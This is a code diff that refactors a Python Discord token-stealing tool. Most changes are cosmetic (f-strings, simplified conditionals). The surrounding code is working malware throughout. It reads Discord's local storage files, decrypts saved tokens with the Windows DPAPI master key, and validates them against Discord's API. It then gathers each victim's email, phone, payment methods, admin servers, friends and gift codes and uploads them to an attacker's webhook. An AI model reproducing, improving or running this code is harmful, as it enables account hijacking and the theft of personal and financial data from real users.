@@ -60,15 +60,20 @@ class extract_tokens:
                 continue
             _discord = name.replace(" ", "").lower()
             if "cord" in path:
-                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
+                if not os.path.exists(f'{self.roaming}\\{_discord}\\Local State'):
                     continue
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for y in re.findall(self.regexp_enc, line):
-                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
-                            
+                            token = self.decrypt_val(
+                                base64.b64decode(y.split('dQw4w9WgXcQ:')[1]),
+                                self.get_master_key(
+                                    f'{self.roaming}\\{_discord}\\Local State'
+                                ),
+                            )
+
                             if self.validate_token(token):
                                 uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                 if uid not in self.uids:
@@ -103,10 +108,7 @@ class extract_tokens:
     def validate_token(self, token: str) -> bool:
         r = requests.get(self.base_url, headers={'Authorization': token})
 
-        if r.status_code == 200:
-            return True
-
-        return False
+        return r.status_code == 200
     
     def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
         iv = buff[3:15]
@@ -130,9 +132,7 @@ class extract_tokens:
 
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-
-        return master_key
+        return CryptUnprotectData(master_key, None, None, None, 0)[1]
 
 class upload_tokens:
     def __init__(self, webhook: str):
@@ -208,7 +208,11 @@ class upload_tokens:
             },
         }
 
-        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
+        return [
+            [flags_dict[flag]['emoji'], flags_dict[flag]['ind']]
+            for flag in flags_dict
+            if flags & 1 << flags_dict[flag]["shift"]
+        ]
 
     
     def upload(self):
@@ -229,26 +233,22 @@ class upload_tokens:
             mfa = user['mfa_enabled']
             avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
             badges = ' '.join([flag[0] for flag in self.calc_flags(user['public_flags'])])
-            
-            if user['premium_type'] == 0:
+
+            if user['premium_type'] == 0 or user['premium_type'] not in [1, 2, 3]:
                 nitro = 'None'
             elif user['premium_type'] == 1:
                 nitro = 'Nitro Classic'
             elif user['premium_type'] == 2:
                 nitro = 'Nitro'
-            elif user['premium_type'] == 3:
-                nitro = 'Nitro Basic'
             else:
-                nitro = 'None'
-
-
+                nitro = 'Nitro Basic'
             if billing:
                 payment_methods = []
 
                 for method in billing:
                     if method['type'] == 1:
                         payment_methods.append('💳')
-                    
+
                     elif method['type'] == 2:
                         payment_methods.append("<:paypal:973417655627288666>")
 
@@ -263,7 +263,7 @@ class upload_tokens:
             if guilds:
                 hq_guilds = []
                 for guild in guilds:
-                    admin = True if guild['permissions'] == '4398046511103' else False
+                    admin = guild['permissions'] == '4398046511103'
                     if admin and guild['approximate_member_count'] >= 100:
                         owner = "✅" if guild['owner'] else "❌"
 
@@ -274,18 +274,13 @@ class upload_tokens:
                             invite = "https://youtu.be/dQw4w9WgXcQ"
 
                         data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
-                        
+
                         if len('\n'.join(hq_guilds)) + len(data) >= 1024:
                             break
 
                         hq_guilds.append(data)
 
-                if len(hq_guilds) > 0:
-                    hq_guilds = '\n'.join(hq_guilds)
-                
-                else:
-                    hq_guilds = None
-
+                hq_guilds = '\n'.join(hq_guilds) if hq_guilds else None
             else:
                 hq_guilds = None
 
@@ -308,15 +303,10 @@ class upload_tokens:
 
                         hq_friends.append(data)
 
-                if len(hq_friends) > 0:
-                    hq_friends = '\n'.join(hq_friends)
-
-                else:
-                    hq_friends = None
-
+                hq_friends = '\n'.join(hq_friends) if hq_friends else None
             else:
                 hq_friends = None
-            
+
             if gift_codes:
                 codes = []
                 for code in gift_codes:
@@ -330,12 +320,7 @@ class upload_tokens:
 
                     codes.append(data)
 
-                if len(codes) > 0:
-                    codes = '\n\n'.join(codes)
-                
-                else:
-                    codes = None
-            
+                codes = '\n\n'.join(codes) if codes else None
             else:
                 codes = None
 
@@ -349,7 +334,7 @@ class upload_tokens:
             embed.add_field(name="<:mfa:1021604916537602088> MFA:", value=f"{mfa}", inline=True)
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
-            
+
             embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
             embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
@@ -358,7 +343,7 @@ class upload_tokens:
             if hq_guilds != None:
                 embed.add_field(name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
-           
+
             if hq_friends != None:
                 embed.add_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
